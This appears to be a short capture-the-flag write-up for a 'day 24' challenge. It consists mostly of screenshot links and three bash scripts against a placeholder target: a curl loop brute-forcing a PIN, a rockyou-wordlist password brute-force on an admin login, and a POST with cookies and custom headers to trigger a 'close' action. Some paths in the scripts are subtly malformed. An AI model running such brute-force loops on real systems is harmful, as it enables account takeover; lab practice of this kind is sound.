# write ups

![1](./day_24/open.jpg)

![1](./day_24/1.png)

![1](./day_24/2.png)

![1](./day_24/3.png)

![1](./day_24/4.png)

![1](./day_24/5.png)


```bash
#! usr/bin/bash

for ((pass = 4000; pass <= 5000; pass++)); do
    echo "Trying $pass"
    res=$(curl -s -A "secretcomputer" -X POST -d "pin=$pass" \
          http://<target_ip>/terminal.php?action=pin)

    if ! echo "$res" | grep -di "fail"; then
        echo -e "[+] Correct Pin Is: $pass"
        break
    else
        echo "Failed Pin $pass"
    fi

done

```

![1](./day_24/6.png)

![1](./day_24/7.png)

```bash
#! usr/bin/bash

for pass in $(cat /usr.share/wordlists/rockyou.txt); do
    echo "Trying $pass"
    res=$(curl -s -A "secretcomputer" -X POST -d "username=admin&password=$pass" \
          http://<target_ip>/terminal.php?action=login)

    if  echo "$res" | grep -di "Invalid"; then
        echo -e "Trying $pass is no working !!!"
    else
        echo "[+] Correct Password is $pass"
        break
    fi
done
```

![1](./day_24/7.1.png)


```bash
curl -A "secretcomputer" -s \
-X POST -b cookies.txt \
-H "Operator: ..." \
-H "X-Force: close" \
http://<target_ip>/terminal.php?action=close
```

![1](./day_24/8.png)

